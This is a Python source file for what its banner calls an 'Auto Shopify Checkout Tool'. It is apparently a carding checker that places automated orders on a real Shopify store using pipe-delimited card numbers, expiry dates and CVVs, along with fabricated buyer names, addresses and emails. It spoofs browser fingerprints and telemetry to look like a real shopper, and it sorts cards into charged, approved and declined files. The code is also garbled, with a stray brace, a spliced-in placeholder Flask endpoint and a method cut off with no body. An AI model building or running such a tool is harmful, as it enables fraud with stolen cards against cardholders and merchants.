import uuid
import requests
import random
import json
import time
import re
import os
import sys
from datetime import datetime

from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import json

app = Flask(__name__)
CORS(app)

# Health check endpoint
@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "ok"}), 200

# Shopify endpoint
@app.route('/shopify', methods=['POST'])
def shopify():
    """
    POST /shopify
    Expected JSON body:
    {
        "store_url": "store.myshopify.com",
        "email": "user@example.com",
        "password": "password"
    }
    """
    try:
        data = request.get_json()
        
        if not data:
            return jsonify({"error": "No JSON body provided"}), 400
        
        store_url = data.get('store_url', '').strip()
        email = data.get('email', '').strip()
        password = data.get('password', '').strip()
        
        # Validate inputs
        if not all([store_url, email, password]):
            return jsonify({
                "error": "Missing required fields: store_url, email, password"
            }), 400
        
        # Normalize store URL
        if not store_url.endswith('.myshopify.com'):
            if '.' not in store_url:
                store_url = f"{store_url}.myshopify.com"
        
        # Your Shopify logic here
        # This is a placeholder - add your actual implementation
        result = {
            "status": "success",
            "store": store_url,
            "email": email,
            "message": "Processing Shopify checkout"
        }
        
        return jsonify(result), 200
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500
}

_UA_POOL = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
]
_CH_UA_POOL = [
    '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    '"Chromium";v="125", "Google Chrome";v="125", "Not-A.Brand";v="99"',
    '"Chromium";v="126", "Google Chrome";v="126", "Not=A?Brand";v="99"',
    '"Chromium";v="123", "Google Chrome";v="123", "Not:A-Brand";v="8"',
]
_CH_UA_PLATFORM_POOL = ['"Windows"', '"macOS"']

def _rand_ua():       return random.choice(_UA_POOL)
def _rand_ch_ua():    return random.choice(_CH_UA_POOL)
def _rand_platform(): return random.choice(_CH_UA_PLATFORM_POOL)


BANNER = r"""
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║        █████╗ ██╗   ██╗████████╗ ██████╗                         ║
║       ██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗                        ║
║       ███████║██║   ██║   ██║   ██║   ██║                        ║
║       ██╔══██║██║   ██║   ██║   ██║   ██║                        ║
║       ██║  ██║╚██████╔╝   ██║   ╚██████╔╝                        ║
║       ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝                         ║
║                                                                  ║
║            ███████╗██╗  ██╗ ██████╗ ██████╗ ██╗███████╗          ║
║            ██╔════╝██║  ██║██╔═══██╗██╔══██╗██║██╔════╝          ║
║            ███████╗███████║██║   ██║██████╔╝██║█████╗            ║
║            ╚════██║██╔══██║██║   ██║██╔═══╝ ██║██╔══╝            ║
║            ███████║██║  ██║╚██████╔╝██║     ██║██║               ║
║            ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝               ║
║                                                                  ║
║              AUTO SHOPIFY CHECKOUT TOOL  v2.0                    ║
║                                                                  ║
║   ⚡ Fast  |  🔐 Secure  |  🤖 Automated  |  👑 @deadlinehere5    ║
║                                                                  ║
║         👨‍💻 Developer  :  @deadlinehere5                             ║
║         📢 Channel     :  @DEADLINECLOUDVIP                            ║
║         © 2026  —  Unauthorized redistribution prohibited        ║
╚══════════════════════════════════════════════════════════════════╝
"""

GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
WHITE  = "\033[97m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"

RESULT_FILES = {
    "CHARGED":  "CHARGE.txt",
    "APPROVED": "APPROVED.txt",
    "DECLINED": "DECLINED.txt",
    "ERROR":    "ERROR.txt",
}

def color(text, c): return f"{c}{text}{RESET}"
def ok(msg):        print(color(f"  ✅  {msg}", GREEN))
def fail(msg):      print(color(f"  ❌  {msg}", RED))
def info(msg):      print(color(f"  ℹ️  {msg}", CYAN))
def warn(msg):      print(color(f"  ⚠️  {msg}", YELLOW))

def save_result(category, line):
    path = RESULT_FILES.get(category, "ERROR.txt")
    ts   = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(path, "a", encoding="utf-8") as f:
        f.write(f"[{ts}] [{category}] {line}\n")


class ShopifyChecker:
    def __init__(self, base_url="https://obliphica.com"):
        self.session   = requests.Session()
        self.base_url  = base_url
        _ua  = _rand_ua()
        _cua = _rand_ch_ua()
        _pf  = _rand_platform()
        self.headers   = {
            'accept':               '*/*',
            'accept-language':      'en-US,en;q=0.9',
            'priority':             'u=1, i',
            'sec-ch-ua':            _cua,
            'sec-ch-ua-mobile':     '?0',
            'sec-ch-ua-platform':   _pf,
            'sec-fetch-dest':       'empty',
            'sec-fetch-mode':       'cors',
            'sec-fetch-site':       'same-origin',
            'user-agent':           _ua
        }
        self.checkout_id               = None
        self.variant_id                = None
        self.product_id                = None
        self.checkout_url              = None
        self.session_token             = None
        self.signature                 = None
        self.stable_id                 = None
        self.queue_token               = None
        self.client_id                 = None
        self.visit_token               = None
        self.shop_id                   = None
        self.cart_token                = None
        self.payment_method_identifier = None
        self.signed_handles            = []
        self.graphql_base              = None
        self._last_responses           = []
        self._verbose                  = False

    def _track_response(self, text):
        self._last_responses.append(text)
        if len(self._last_responses) > 2:
            self._last_responses.pop(0)

    def _log(self, msg):
        if self._verbose:
            print(color(f"[*] {msg}", DIM))

    def get_random_address(self):
        first_names = ["James","Mary","Robert","Patricia","John","Jennifer","Michael","Linda","David","Susan"]
        last_names  = ["Smith","Jones","Taylor","Brown","Williams","Wilson","Johnson","Davies","Miller","Davis"]
        streets     = ["Maple St","Oak Ave","Washington Blvd","Lakeview Dr","Park Way","Broadway","Elm St","Pine Ave"]
        cities = [
            ("Ketchikan","AK","99901"), ("Los Angeles","CA","90001"),
            ("New York","NY","10001"),  ("Houston","TX","77001"),
            ("Miami","FL","33101"),     ("Chicago","IL","60601"),
            ("Phoenix","AZ","85001"),   ("Seattle","WA","98101"),
        ]
        fn = random.choice(first_names)
        ln = random.choice(last_names)
        street = f"{random.randint(100,9999)} {random.choice(streets)}"
        city, state, zp = random.choice(cities)
        return {
            "firstName": fn, "lastName": ln,
            "address1": street, "city": city,
            "zoneCode": state, "postalCode": zp,
            "countryCode": "US",
            "phone": f"+1703{random.randint(210,999)}{random.randint(1000,9999)}",
            "company": "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=5))
        }

    def get_initial_session(self):
        self._log("STEP 1 — Initializing session via /cart.js ...")
        try:
            r = self.session.get(f"{self.base_url}/cart.js", headers=self.headers, timeout=15)
            if r.status_code != 200 and r.status_code != 302:
                return False
        except Exception as e:
            return False
        self.client_id   = self.session.cookies.get('_shopify_y') or self.session.cookies.get('shopify_client_id') or str(uuid.uuid4())
        self.visit_token = self.session.cookies.get('_shopify_s') or str(uuid.uuid4())
        try:
            cart_data = r.json() if r.status_code == 200 else {}
        except:
            cart_data = {}
        self.cart_token = cart_data.get('token', '')
        return True

    def get_delivery_estimates(self):
        self._log("STEP 2 — Fetching delivery estimates ...")
        url = f"{self.base_url}/api/unstable/graphql.json"
        headers = self.headers.copy()
        headers['content-type'] = 'application/json'
        headers['origin'] = self.base_url
        query = """query DeliveryEstimates($productVariantId:ID!$countryCode:CountryCode$postalCode:String$isPostalCodeOverride:Boolean$sellingPlanIdV2:ID){deliveryEstimates(productVariantId:$productVariantId countryCode:$countryCode postalCode:$postalCode isPostalCodeOverride:$isPostalCodeOverride sellingPlanIdV2:$sellingPlanIdV2){selectedShippingOption{presentmentTemplate{titleFormat}minDeliveryTime maxDeliveryTime minCalendarDaysToDelivery maxCalendarDaysToDelivery expiresAt cost{amount}}deliveryAddress{zip timezone}productHandle variant product freeDeliveryThreshold{amount currencyCode}}}"""
        body = {"query": query, "schemaHandle": "storefront", "versionHandle": "unstable",
                "variables": {"productVariantId": f"gid://shopify/ProductVariant/{self.variant_id}"}}
        try:
            self.session.post(url, json=body, headers=headers)
        except:
            pass
        return True

    def find_cheapest_product(self):
        self._log("STEP 3 — Finding cheapest available product ...")
        try:
            r = self.session.get(f"{self.base_url}/products.json", headers=self.headers)
            products = r.json().get('products', [])
            cheapest_variant = None
            min_price = float('inf')
            for p in products:
                for v in p['variants']:
                    if v.get('available'):
                        price = float(v['price'])
                        if price < min_price:
                            min_price = price
                            cheapest_variant = v
                            self.product_id = p['id']
            if cheapest_variant:
                self.variant_id = cheapest_variant['id']
                return True
            return False
        except:
            return False

    def add_to_cart(self):
        self._log("STEP 4 — Adding to cart ...")
        url = f"{self.base_url}/cart/add.js"
        headers = self.headers.copy()
        headers['content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
        headers['accept'] = 'application/json, text/javascript, */*; q=0.01'
        headers['x-requested-with'] = 'XMLHttpRequest'
        headers['origin'] = self.base_url
        data = {'id': self.variant_id, 'quantity': 1, 'form_type': 'product', 'utf8': '✓'}
        r = self.session.post(url, data=data, headers=headers)
        if r.status_code == 200:
            j = r.json()
            self.cart_token = j.get('cart_token', self.cart_token)
            return True
        return False

    def monorail_produce(self):
        url = f"{self.base_url}/.well-known/shopify/monorail/v1/produce"
        headers = self.headers.copy()
        headers['content-type'] = 'text/plain'
        headers['origin'] = self.base_url
        headers['priority'] = 'u=4, i'
        headers['sec-fetch-mode'] = 'no-cors'
        payload = {
            "schema_id": "perf_kit_on_interaction/3.2",
            "payload": {
                "url": f"{self.base_url}/collections/all",
                "page_type": "product",
                "shop_id": int(self.shop_id or 25603230),
                "application": "storefront-renderer",
                "session_token": self.visit_token,
                "unique_token": self.client_id,
                "micro_session_id": str(uuid.uuid4()).upper(),
                "micro_session_count": 1,
                "interaction_to_next_paint": random.randint(30, 80),
                "seo_bot": False,
                "referrer": self.base_url,
                "worker_start": 0,
                "next_hop_protocol": "h3"
            },
            "metadata": {
                "event_created_at_ms": int(time.time() * 1000),
                "event_sent_at_ms": int(time.time() * 1000)
            }
        }
        try:
            self.session.post(url, data=json.dumps(payload), headers=headers)
        except:
            pass

    def monorail_produce_batch(self, event_name="product_added_to_cart", schema_version="4.27"):
        url = f"{self.base_url}/.well-known/shopify/monorail/unstable/produce_batch"
        headers = self.headers.copy()
        headers['content-type'] = 'text/plain;charset=UTF-8'
        headers['origin'] = self.base_url
        headers['priority'] = 'u=4, i'
        headers['sec-fetch-mode'] = 'no-cors'
        now_ms   = int(time.time() * 1000)
        event_id = f"sh-{str(uuid.uuid4()).upper()[:23]}"
        events   = [{
            "schema_id": f"storefront_customer_tracking/{schema_version}",
            "payload": {
                "api_client_id": 580111, "event_id": event_id, "event_name": event_name,
                "shop_id": int(self.shop_id or 25603230), "total_value": 47, "currency": "USD",
                "event_time": now_ms,
                "event_source_url": self.checkout_url or self.base_url,
                "unique_token": self.client_id,
                "page_id": str(uuid.uuid4()).upper(),
                "deprecated_visit_token": self.visit_token,
                "session_id": f"sh-{str(uuid.uuid4()).upper()[:23]}",
                "source": "trekkie-storefront-renderer",
                "ccpa_enforced": True, "gdpr_enforced": False,
                "is_persistent_cookie": True, "analytics_allowed": True,
                "marketing_allowed": True, "sale_of_data_allowed": False,
                "preferences_allowed": True, "shopify_emitted": True,
                "asset_version_id": "8aba195e1f0d50eb4ee5422e0104eb204e686edd"
            },
            "metadata": {"event_created_at_ms": now_ms}
        }]
        body = {"events": events, "metadata": {"event_sent_at_ms": now_ms}}
        try:
            self.session.post(url, data=json.dumps(body), headers=headers)
        except:
            pass

    def view_cart_page(self):
        headers = self.headers.copy()
        headers['accept']         = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        headers['sec-fetch-dest'] = 'document'
        headers['sec-fetch-mode'] = 'navigate'
        headers['priority']       = 'u=0, i'
        try:
            self.session.get(f"{self.base_url}/cart", headers=headers)
        except:
            pass

    def refresh_cart(self):
        headers = self.headers.copy()
        headers['referer'] = f"{self.base_url}/cart"
        try:
            r = self.session.get(f"{self.base_url}/cart.js", headers=headers)
            if r.status_code == 200:
                data = r.json()
                self.cart_token = data.get('token', self.cart_token)
        except:
            pass

    def start_checkout(self):
        self._log("STEP 9 — Starting checkout ...")
        url = f"{self.base_url}/cart"
        headers = self.headers.copy()
        headers['accept']                  = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        headers['content-type']            = 'application/x-www-form-urlencoded'
        headers['cache-control']           = 'max-age=0'
        headers['origin']                  = self.base_url
        headers['referer']                 = f"{self.base_url}/cart"
        headers['priority']                = 'u=0, i'
        headers['sec-fetch-dest']          = 'document'
        headers['sec-fetch-mode']          = 'navigate'
        headers['sec-fetch-user']          = '?1'
        headers['upgrade-insecure-requests'] = '1'
        data = f'updates%5B%5D=1&checkout=&cart_token={self.cart_token or ""}'
        r = self.session.post(url, data=data, headers=headers, allow_redirects=True)
        self.checkout_url = r.url
        match = re.search(r'/checkouts/(?:cn/)?([a-zA-Z0-9]+)', self.checkout_url)
        if match:
            self.checkout_id = match.group(1)
            return True
        return False

    def get_checkout_metadata(self):
        self._log("STEP 10 — Extracting tokens from checkout page ...")
        headers = self.headers.copy()
        headers['accept']                  = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        headers['sec-fetch-dest']          = 'document'
        headers['sec-fetch-mode']          = 'navigate'
        headers['sec-fetch-site']          = 'same-origin'
        headers['upgrade-insecure-requests'] = '1'
        headers['priority']                = 'u=0, i'
        r = self.session.get(self.checkout_url, headers=headers)
        html = r.text

        m = re.search(r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', html)
        if m:
            self.session_token = m.group(1)
        if not self.session_token:
            pats = [
                r'"sessionToken"\s*:\s*"(AAEB[^"]+)"',
                r"'sessionToken'\s*:\s*'(AAEB[^']+)'",
                r'sessionToken[\s:=]+["\'"]?(AAEB[A-Za-z0-9_\-]+)',
                r'\"sessionToken\":\"(AAEB[^\"]+)',
                r'(AAEB[A-Za-z0-9_\-]{30,})',
            ]
            for pat in pats:
                m = re.search(pat, html)
                if m:
                    self.session_token = m.group(1)
                    break

        sig_patterns = [
            r'"shopifyPaymentRequestIdentificationSignature"\s*:\s*"(eyJ[^"]+)"',
            r'"identificationSignature"\s*:\s*"(eyJ[^"]+)"',
            r'"paymentsSignature"\s*:\s*"(eyJ[^"]+)"',
            r'"signature"\s*:\s*"(eyJ[^"]+)"',
            r'(eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)',
        ]
        for pat in sig_patterns:
            m = re.search(pat, html)
            if m:
                self.signature = m.group(1)
                break

        stable_patterns = [
            r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"',
            r'stableId[\s:=]+["\'"]([0-9a-f-]{36})',
        ]
        for pat in stable_patterns:
            m = re.search(pat, html)
            if m:
                self.stable_id = m.group(1)
                break
        if not self.stable_id:
            self.stable_id = str(uuid.uuid4())

        m = re.search(r'queueToken&quot;:&quot;([^&]+)&quot;', html)
        if not m:
            m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', html)
        self.queue_token = m.group(1) if m else None

        m = re.search(r'paymentMethodIdentifier&quot;:&quot;([^&]+)&quot;', html)
        if not m:
            m = re.search(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"', html)
        self.payment_method_identifier = m.group(1) if m else None

        m = re.search(r'"shopId"\s*:\s*(\d+)', html)
        if not m:
            m = re.search(r'shop_id[\s:=]+(\d+)', html)
        self.shop_id = m.group(1) if m else "25603230"

        m = re.search(r'"buildId"\s*:\s*"([a-f0-9]{40})"', html)
        if not m:
            m = re.search(r'/build/([a-f0-9]{40})/', html)
        self.build_id = m.group(1) if m else '4663384ede457d59be87980de7797171b19f2a1b'

        pci_m = re.search(r'checkout\.pci\.shopifyinc\.com/build/([a-f0-9]+)/', html)
        self.pci_build_hash = pci_m.group(1) if pci_m else 'a8e4a94'

        signed_handles = re.findall(r'"signedHandle"\s*:\s*"([^"]+)"', html)
        if not signed_handles:
            raw = re.findall(r'\\"signedHandle\\":\"([^\\"]+)', html)
            signed_handles = [h.replace('\\n','').replace('\\r','') for h in raw]
        self.signed_handles = signed_handles

        print()
        print(color("  ─── Session Tokens ─────────────────────────────", CYAN))
        if self.session_token:
            ok(f"sessionToken            FOUND  ({self.session_token[:20]}...)")
        if self.signature:
            ok(f"signature               FOUND  ({self.signature[:20]}...)")
        ok(f"stableId                {self.stable_id}")
        if self.queue_token:
            ok(f"queueToken              FOUND  ({self.queue_token[:20]}...)")
        if self.payment_method_identifier:
            ok(f"paymentMethodIdentifier FOUND")
        print(color("  ────────────────────────────────────────────────", CYAN))
        print()

        from urllib.parse import urlparse as _up
        parsed = _up(self.checkout_url)
        if 'shopify.com' in parsed.netloc and 'checkout.' in parsed.netloc:
            self.graphql_base = f"{parsed.scheme}://{parsed.netloc}"
        else:
            self.graphql_base = self.base_url

        if not self.session_token:
            return False
        return True

    def vault_card(self, cc_details):
        parts = cc_details.strip().split('|')
        if len(parts) != 4:
            return None
        card_num, month, year, cvv = parts
        address = self.get_random_address()
        url     = "https://checkout.pci.shopifyinc.com/sessions"
        headers = {
            'accept':               'application/json',
            'accept-language':      'en-US,en;q=0.9',
            'content-type':         'application/json',
            'origin':               'https://checkout.pci.shopifyinc.com',
            'referer':              f'https://checkout.pci.shopifyinc.com/build/{getattr(self,"pci_build_hash","a8e4a94")}/number-ltr.html?identifier=&locationURL={self.checkout_url or ""}',
            'sec-ch-ua':            self.headers.get('sec-ch-ua', _rand_ch_ua()),
            'sec-ch-ua-mobile':     '?0',
            'sec-ch-ua-platform':   self.headers.get('sec-ch-ua-platform', _rand_platform()),
            'sec-fetch-dest':       'empty',
            'sec-fetch-mode':       'cors',
            'sec-fetch-site':       'same-origin',
            'sec-fetch-storage-access': 'none',
            'user-agent':           self.headers.get('user-agent', _rand_ua()),
            'priority':             'u=1, i'
        }
        if self.signature:
            headers['shopify-identification-signature'] = self.signature
        payload = {
            "credit_card": {
                "number":             card_num.strip(),
                "month":              int(month.strip()),
                "year":               int(year.strip()),
                "verification_value": cvv.strip(),
                "start_month":        None, "start_year": None,
                "issue_number":       "",
                "name":               f"{address['firstName']} {address['lastName']}"
            },
            "payment_session_scope": __import__('urllib.parse', fromlist=['urlparse']).urlparse(self.base_url).netloc
        }
        self._send_telemetry("HostedFields_CardFields_vaultCard_called", "counter", 1, origin=self.base_url)
        r = self.session.post(url, json=payload, headers=headers)
        if r.status_code in (200, 201):
            vault_id = r.json().get('id')
            self._send_telemetry("HostedFields_CardFields_form_submitted", "counter", 1)
            self._send_telemetry("HostedFields_CardFields_deposit_time",   "histogram", 325)
            return vault_id
        return None

    def _send_telemetry(self, metric_name, metric_type, value, origin="https://checkout.pci.shopifyinc.com"):
        url = "https://us-central1-shopify-instrumentat-ff788286.cloudfunctions.net/telemetry"
        headers = {
            'accept':             '*/*',
            'accept-language':    'en-US,en;q=0.9',
            'content-type':       'application/json',
            'origin':             origin,
            'referer':            f"{origin}/",
            'sec-ch-ua':          self.headers.get('sec-ch-ua', _rand_ch_ua()),
            'sec-ch-ua-mobile':   '?0',
            'sec-ch-ua-platform': self.headers.get('sec-ch-ua-platform', _rand_platform()),
            'sec-fetch-dest':     'empty',
            'sec-fetch-mode':     'cors',
            'sec-fetch-site':     'cross-site',
            'user-agent':         self.headers.get('user-agent', _rand_ua()),
            'priority':           'u=1, i'
        }
        tags = {}
        if metric_name == "HostedFields_CardFields_deposit_time":
            tags = {"retries": 10, "status": 200, "cardsinkUrl": "/sessions"}
        body = {"service": "hosted-fields",
                "metrics": [{"type": metric_type, "value": value, "name": metric_name, "tags": tags}]}
        try:
            requests.post(url, json=body, headers=headers, timeout=5)
        except:
            pass

    def submit_for_completion(self, vault_id, address, card_number=""):
        self._log("STEP 12 — SubmitForCompletion ...")
        if not self.session_token:
            return None
        url = f"{getattr(self,'graphql_base',self.base_url)}/checkouts/unstable/graphql"
        headers = self.headers.copy()
        headers['accept']                       = 'application/json'
        headers['accept-language']              = 'en-US,en;q=0.9'
        headers['content-type']                 = 'application/json'
        headers['origin']                       = self.base_url
        headers['priority']                     = 'u=1, i'
        headers['referer']                      = self.checkout_url
        headers['shopify-checkout-client']      = 'checkout-web/1.0'
        headers['shopify-checkout-source']      = f'id="{self.checkout_id}", type="cn"'
        headers['x-checkout-one-session-token'] = self.session_token
        headers['x-checkout-web-deploy-stage']  = 'production'
        headers['x-checkout-web-server-handling']   = 'fast'
        headers['x-checkout-web-server-rendering']  = 'yes'
        headers['x-checkout-web-source-id']     = self.checkout_id
        build_id = getattr(self,'build_id','4663384ede457d59be87980de7797171b19f2a1b')
        headers['x-checkout-web-build-id'] = build_id

        attempt_token = f"{self.checkout_id}-uaz{''.join(random.choices('abcdefghijklmnopqrstuvwxyz',k=9))}"
        stable_id     = self.stable_id
        # BIN = first 8 digits of the real card number (NOT the vault token)
        _raw_cc   = card_number.replace(' ', '').replace('-', '')
        card_bin  = _raw_cc[:8] if len(_raw_cc) >= 8 else _raw_cc
        buyer_email   = f"{address['firstName'].lower()}{random.randint(10,99)}@gmail.com"
        delivery_expectation_lines = [{"signedHandle": sh} for sh in getattr(self,'signed_handles',[])]
        pm_identifier = self.payment_method_identifier or vault_id
        session_id    = vault_id

        MUTATION = 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}...on PendingTermViolation{code localizedMessage nonLocalizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}'

        payload = {
            "query": MUTATION,
            "operationName": "SubmitForCompletion",
            "variables": {
                "attemptToken": attempt_token,
                "metafields":   [],
                "analytics": {
                    "requestUrl": self.checkout_url,
                    "pageId":     str(uuid.uuid4()).upper()
                },
                "input": {
                    "checkpointData": None,
                    "sessionInput":   {"sessionToken": self.session_token},
                    "queueToken":     self.queue_token,
                    "discounts":      {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {
                                "streetAddress": {
                                    "address1":    address['address1'],
                                    "address2":    "",
                                    "city":        address['city'],
                                    "countryCode": address['countryCode'],
                                    "postalCode":  address['postalCode'],
                                    "company":     address.get('company',''),
                                    "firstName":   address['firstName'],
                                    "lastName":    address['lastName'],
                                    "zoneCode":    address['zoneCode'],
                                    "phone":       address['phone'],
                                    "oneTimeUse":  False
                                }
                            },
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyMatchingConditions": {
                                    "estimatedTimeInTransit": {"any": True},
                                    "shipments":              {"any": True}
                                },
                                "options": {"phone": address['phone']}
                            },
                            "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                            "deliveryMethodTypes":    ["SHIPPING"],
                            "expectedTotalPrice":     {"any": True},
                            "destinationChanged":     True
                        }],
                        "noDeliveryRequired":         [],
                        "useProgressiveRates":        False,
                        "prefetchShippingRatesStrategy": None,
                        "supportsSplitShipping":      True
                    },
                    "deliveryExpectations": {
                        "deliveryExpectationLines": delivery_expectation_lines
                    },
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stable_id,
                            "merchandise": {
                                "productVariantReference": {
                                    "id":        f"gid://shopify/ProductVariantMerchandise/{self.variant_id}",
                                    "variantId": f"gid://shopify/ProductVariant/{self.variant_id}",
                                    "properties":        [],
                                    "sellingPlanId":     None,
                                    "sellingPlanDigest": None
                                }
                            },
                            "quantity":              {"items": {"value": 1}},
                            "expectedTotalPrice":    {"any": True},
                            "lineComponentsSource":  None,
                            "lineComponents":        []
                        }]
                    },
                    "memberships": {"memberships": []},
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [{
                            "paymentMethod": {
                                "directPaymentMethod": {
                                    "paymentMethodIdentifier": pm_identifier,
                                    "sessionId": session_id,
                                    "billingAddress": {
                                        "streetAddress": {
                                            "address1":    address['address1'],
                                            "address2":    "",
                                            "city":        address['city'],
                                            "countryCode": address['countryCode'],
                                            "postalCode":  address['postalCode'],
                                            "company":     address.get('company',''),
                                            "firstName":   address['firstName'],
                                            "lastName":    address['lastName'],
                                            "zoneCode":    address['zoneCode'],
                                            "phone":       address['phone']
                                        }
                                    },
                                    "cardSource": None
                                },
                                "giftCardPaymentMethod":              None,
                                "redeemablePaymentMethod":            None,
                                "walletPaymentMethod":                None,
                                "walletsPlatformPaymentMethod":       None,
                                "localPaymentMethod":                 None,
                                "paymentOnDeliveryMethod":            None,
                                "paymentOnDeliveryMethod2":           None,
                                "manualPaymentMethod":                None,
                                "customPaymentMethod":                None,
                                "offsitePaymentMethod":               None,
                                "customOnsitePaymentMethod":          None,
                                "deferredPaymentMethod":              None,
                                "customerCreditCardPaymentMethod":    None,
                                "paypalBillingAgreementPaymentMethod": None,
                                "remotePaymentInstrument":            None
                            },
                            "amount": {"any": True}
                        }],
                        "billingAddress": {
                            "streetAddress": {
                                "address1":    address['address1'],
                                "address2":    "",
                                "city":        address['city'],
                                "countryCode": address['countryCode'],
                                "postalCode":  address['postalCode'],
                                "company":     address.get('company',''),
                                "firstName":   address['firstName'],
                                "lastName":    address['lastName'],
                                "zoneCode":    address['zoneCode'],
                                "phone":       address['phone']
                            }
                        },
                        "creditCardBin": card_bin
                    },
                    "buyerIdentity": {
                        "customer": {
                            "presentmentCurrency": address.get('currency','USD'),
                            "countryCode":         address.get('countryCode','US')
                        },
                        "email":              buyer_email,
                        "emailChanged":       False,
                        "phoneCountryCode":   address.get('countryCode','US'),
                        "marketingConsent": [
                            {"sms":   {"consentState": "DECLINED", "value": address['phone'], "countryCode": address.get('countryCode','US')}},
                            {"email": {"consentState": "GRANTED",  "value": buyer_email}}
                        ],
                        "shopPayOptInPhone": {
                            "number":      address['phone'],
                            "countryCode": address.get('countryCode','US')
                        },
                        "rememberMe":               False,
                        "setShippingAddressAsDefault": False
                    },
                    "tip":     {"tipLines": []},
                    "taxes": {
                        "proposedAllocations":            None,
                        "proposedTotalAmount":            {"any": True},
                        "proposedTotalIncludedAmount":    None,
                        "proposedMixedStateTotalAmount":  None,
                        "proposedExemptions":             []
                    },
                    "note": {
                        "message": None,
                        "customAttributes": [
                            {"key": "gorgias.guest_id",  "value": self.client_id or ""},
                            {"key": "gorgias.session_id","value": str(uuid.uuid4())}
                        ]
                    },
                    "localizationExtension": {"fields": []},
                    "shopPayArtifact": {
                        "optIn": {
                            "vaultEmail":  "",
                            "vaultPhone":  address['phone'],
                            "optInSource": "REMEMBER_ME"
                        }
                    },
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {
                        "signature":             None,
                        "signatureUuid":         None,
                        "lineItemScriptChanges": [],
                        "paymentScriptChanges":  [],
                        "shippingScriptChanges": []
                    },
                    "optionalDuties":  {"buyerRefusesDuties": False},
                    "captcha":         None,
                    "cartMetafields":  []
                }
            },
            "operationName": "SubmitForCompletion"
        }

        max_retries = 12
        receipt_id  = None

        for attempt_num in range(max_retries):
            r = self.session.post(url, json=payload, headers=headers)
            self._track_response(r.text[:300])
            try:
                res = r.json()
            except:
                return None

            if 'errors' in res and res.get('data') is None:
                return None

            data     = res.get('data', {})
            submit   = data.get('submitForCompletion', {})
            typename = submit.get('__typename', '')

            if typename in ('SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion'):
                receipt    = submit.get('receipt', {})
                receipt_id = receipt.get('id')
                return receipt_id

            elif typename == 'SubmitFailed':
                return None

            elif typename == 'Throttled':
                poll_after       = submit.get('pollAfter', 1000)
                self.queue_token = submit.get('queueToken', self.queue_token)
                time.sleep(poll_after / 1000.0)
                payload['variables']['input']['queueToken'] = self.queue_token
                continue

            elif typename == 'CheckpointDenied':
                return None

            elif typename == 'SubmitRejected':
                errors = submit.get('errors', [])
                codes  = [e.get('code','') for e in errors]
                if 'WAITING_PENDING_TERMS' in codes:
                    time.sleep(0.5)
                    continue
                return None

            else:
                time.sleep(0.5)
                if attempt_num < max_retries - 1:
                    continue
                return None

        return None

    def monorail_payment_submitted(self):
